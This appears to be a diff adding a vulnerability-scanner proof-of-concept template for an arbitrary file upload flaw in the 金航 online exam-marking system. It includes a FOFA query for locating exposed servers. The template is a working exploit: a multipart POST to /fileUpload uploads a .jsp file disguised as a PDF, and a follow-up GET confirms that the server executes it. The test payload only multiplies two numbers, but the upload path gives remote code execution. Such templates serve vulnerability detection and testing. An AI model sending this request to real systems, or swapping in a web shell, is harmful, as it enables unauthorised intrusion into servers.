@@ -1,0 +1,49 @@
+id: poc-yaml-hsjinhang-fileupload-upload
+info:
+  name: 金航网上阅卷系统fileUpload任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 金航网上阅卷系统
+  fofa: body="js/insteadSelect/jquery.insteadSelect.css"
+variables:
+  filename: to_lower(random_str(10))
+  t1: random_int(100,1000)
+  t2: random_int(100,1000)
+  t3: t1 * t2
+requests:
+- method: POST
+  path: /fileUpload
+  headers:
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+  data: '--00content0boundary00
+
+    Content-Disposition: form-data; name="upload"; filename="{{.filename}}.jsp"
+
+    Content-Type: application/pdf
+
+
+    <%out.println({{.t1}}*{{.t2}});%>
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="uploadContentType"
+
+
+    pdf
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="uploadFileName"
+
+
+    1.jsp
+
+    --00content0boundary00--
+
+    '
+  expression: "status_code == 200 && \ncontains(body,\"文件上传成功\")\n"
+- method: GET
+  path: /upload/{{.filename}}.jsp
+  expression: "status_code == 200 && \ntrim(body) == t3\n"
+transport: http
